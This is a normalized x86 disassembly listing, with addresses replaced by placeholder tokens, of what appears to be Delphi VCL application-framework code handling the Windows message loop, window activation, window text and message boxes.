mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_461758
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_462110
jmp r-xdata
jmp r-xdata
call sub_433abc
call sub_433b9c
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_461748
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_461758
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_461750
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_459628
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_4618b8
pop ecx
jmp r-xdata
call sub_4596dc
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_4618b8
pop ecx
jmp r-xdata
call sub_433abc
call sub_433bf8
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d5f0
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_462060
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_461748
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_461078
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_4493d8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_4493d8
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_462110
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_461078
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_4493d8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_461758
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_4493d8
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_45cd84
mov eax [ ebx + 0x44 ]
call sub_45f1a0
sub_462210
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_46224c
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_40405c
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_4040f8
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_462298
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46231a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
lea eax [ ebx + 0x8c ]
mov edx esi
call sub_40405c
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_46224c
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404414
jne r-xdata
mov eax esi
call sub_4044c8
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowTextA
lea eax [ ebx + 0x8c ]
call sub_404008
jmp r-xdata
cmp [ ebx + 0x8c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462321
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_462328
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_46234c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_46239c
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_43fa98
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_4493d8
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_462454
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_4633cc
sub_462488
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_4493d8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403430
test al al
jne r-xdata
sub_4624f4
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_462454
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_46234c
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_46239c
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_462328
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_4625a4
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_4624f4
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_462e74
sub_4625c8
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_41a448
mov eax 0x8
call sub_40279c
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_41a30c
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_462624
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_41a468
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4027bc
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_41a358
jmp r-xdata
sub_4626b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push sub_4626f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_4493b4
mov [ esi + 0x44 ] edi
sub_462738
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_462816
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_4595a0
call sub_407fbc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46281d
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_45cd84
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push sub_4627dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4625a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_45bc8c
mov eax [ ebp - 0x4 ]
call sub_462060
jmp r-xdata
sub_462838
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40282c
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40284c
push eax
call sub_40282c
pop edx
call sub_40b8f4
call sub_40282c
mov edx [ rw-data ]
call sub_4033c0
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40282c
mov edx eax
mov eax ebx
call sub_462a30
pop esi
pop ebx
retn
call sub_40282c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_4628c8
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_459628
mov [ ebp - 0x10 ] eax
call sub_459544
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_4617c4
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_462a1d
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462a24
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_4596dc
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_45954c
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_462a30
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462aeb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_4040a0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_46224c
mov eax [ ebp - 0x108 ]
call sub_4044c8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044c8
mov edx eax
mov eax ebx
pop ecx
call sub_4628c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462af2
lea eax [ ebp - 0x108 ]
call sub_404008
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
call sub_4087e4
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402d34
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402b4c
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4042d0
sub_462b08
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_449574
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_4496dc
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_4631ac
test al al
je r-xdata
call sub_4493d8
mov ebp eax
mov eax edi
call sub_4493d8
mov ebp eax
mov eax esi
call sub_4631ac
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_462c70
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_462cc8
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_4631ac
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4639f8
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462ccf
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_462cd8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_462d30
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_4631ac
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4639f8
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462d37
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_462d48
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403234
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_442d58
jmp r-xdata
sub_462d98
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_46029c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_4493d8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_460288
mov ebx eax
mov eax ebx
call sub_4496dc
test al al
je r-xdata
mov eax ebx
call sub_4493d8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_462dfc
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_441464
mov edi eax
call sub_43fd60
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_443d6c
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_443d6c
sub_462e74
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_462f84
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_462dfc
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_460e04
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_43fd1c
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_463034
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_4036d4#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_4633cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_462d98
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_420090
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462f8b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40402c
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_462f94
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_460280
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_46026c
movzx edx di
xor ecx ecx
call sub_443d6c
inc esi
dec ebx
jne r-xdata
sub_462fd0
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_462044
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_462044
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_462f94
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_463034
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_404414
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_40405c
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43c7c8
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44f674
xor eax eax
push ebp
push sub_4630b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403234
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_4630c8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_463124
push ebp
mov ebp esp
push ecx
